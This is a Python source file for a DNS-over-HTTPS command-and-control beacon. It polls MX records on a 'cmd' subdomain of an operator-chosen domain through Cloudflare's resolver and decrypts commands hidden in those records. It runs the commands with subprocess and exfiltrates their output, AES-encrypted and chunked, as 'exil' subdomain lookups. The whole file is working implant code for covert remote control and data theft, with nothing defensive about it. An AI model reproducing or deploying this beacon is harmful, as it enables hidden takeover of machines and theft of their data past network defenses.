import time
import os
import base64
import requests
import subprocess
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

'''
Important: getting a command will query cmd.<domain.com> and responses will be chunked and sent to exil.<data>.<domain.com>
'''

DOH_URL = "https://cloudflare-dns.com/dns-query"
HEADERS = {"Accept": "application/dns-json"}

def chunk_string(text: str, chunk_size: int = 32) -> list[str]:
    """Splits a string into segments of up to 32 characters each."""
    return [text[i : i + chunk_size] for i in range(0, len(text), chunk_size)]

def decrypt_payload(encoded_payload: str, aes_key: str = None) -> str:
    """Decodes base64url payload and optionally decrypts via AES-GCM."""
    # Restore base64 padding and standard URL characters
    padded = encoded_payload.replace("-", "+").replace("_", "/")
    padded += "=" * ((4 - len(padded) % 4) % 4)
    raw_bytes = base64.b64decode(padded)

    # If no key provided, handle as plain base64 text
    if not aes_key:
        return raw_bytes.decode('utf-8', errors='ignore')

    # AES-256-GCM Decryption (12-byte nonce + ciphertext)
    
    key_bytes = bytes.fromhex(aes_key)
    aesgcm = AESGCM(key_bytes)
    
    nonce = raw_bytes[:12]
    ciphertext = raw_bytes[12:]
    return aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8', errors='ignore')
    
def encrypt_payload(payload: str, aes_key: str = None) -> str:
    """Encrypts a payload optionally via AES-256-GCM and encodes it to base64url."""
    if not aes_key:
        encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        return encoded.rstrip("=").replace("+", "-").replace("/", "_")
        
    
    
    key_bytes = bytes.fromhex(aes_key)
    aesgcm = AESGCM(key_bytes)        
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, payload.encode('utf-8'), None)
    packed = nonce + ciphertext
    encoded = base64.b64encode(packed).decode('utf-8')
    return encoded.rstrip("=").replace("+", "-").replace("/", "_") 
    
def query_doh_mx(domain: str) -> list:
    """Queries Cloudflare DoH for MX records on beacon subdomain."""
    
    target_fqdn = f"cmd.{domain}"
    params = {"name": target_fqdn, "type": "MX"}
   
    
    try:
        r = requests.get(DOH_URL, headers=HEADERS, params=params, timeout=10)
        r.raise_for_status()
        data = r.json()
        
        mx_targets = []
        if "Answer" in data:
            for ans in data["Answer"]:
                if ans.get("type") == 15:  # MX Type
                    # Data returns as "10 cmd.<payload>.domain.com."
                    parts = ans.get("data", "").split()
                    if len(parts) == 2:
                        mx_targets.append(parts[1].rstrip("."))
        return mx_targets
    except Exception as e:
        print(f"[-] DoH Query Error: {e}")
        return []

def return_doh_mx(domain: str, message: str, key: str):
    """Queries Cloudflare DoH for MX records on beacon subdomain."""
    
   
    
    encmessage = encrypt_payload(message, key)
    ret_list = chunk_string(encmessage)
    
    for data in ret_list:
        target_fqdn = f"exil.{data}.{domain}"
        params = {"name": target_fqdn, "type": "MX"}
        while(1):
            try:
                r = requests.get(DOH_URL, headers=HEADERS, params=params, timeout=10)
                r.raise_for_status()
                data = r.json()
                if data.get("Status") == 0 and "Answer" in data:
                    break
                else:
                    pass
                time.sleep(2)
        
        
            except Exception as e:
                print(f"[-] DoH Query Error: {e}")
    target_fqdn = f"done.{domain}"
    params = {"name": target_fqdn, "type": "MX"}    
    try:
        r = requests.get(DOH_URL, headers=HEADERS, params=params, timeout=10)
        r.raise_for_status()
        data = r.json()
    except Exception as e:
        print(f"[-] DoH Query Error: {e}")


def run_dns_tasks(params: dict):
    
    domain = params.get("domain")
    key = params.get("key")
    
    
    
    if len(key) == 64:
        print("AES Key detected - using AES256 encryption.")
    else:
        print("No AES key detected. Skipping encryption")
        key = None
    print("Loading Complete, please make sure you are running the dns server script on your nameserver")
    
    print(f"[*] Querying Cloudflare DoH ...")
    
    while(True):
        answers = query_doh_mx(domain)
        time.sleep(3)
        if not answers:
            print("[-] No MX records returned from DoH.")
            return

        for mx_host in answers:
            print(f"[+] Received MX Target Host: {mx_host}")
        
            if mx_host.startswith("cmd."):
            # Extract raw payload between 'cmd.' and your domain
            # e.g., 'cmd.<PAYLOAD>.c2.yourdomain.com'
                payload_segment = mx_host.split(".")[1]
            
                try:
                    cmd_decoded = decrypt_payload(payload_segment, key)
                    print(f"[+] Successfully Decoded Command: '{cmd_decoded}'")
                
                    # Check for "test" command
                    
                    try:
                        cmd_array = cmd_decoded.split()
                        result = subprocess.run(cmd_array, capture_output=True, text=True)
                        message = result.stdout.strip()
                        return_doh_mx(domain, message, key)
                    except Exception as e:
                        print(f"[-] Command Failed")
                   
                        
                    
                except Exception as e:
                    print(f"[-] Failed to decode/decrypt payload: {e}")
                
            elif mx_host.startswith("idle."):
                print("[*] Server responded with IDLE state (no command in queue).")
                
    
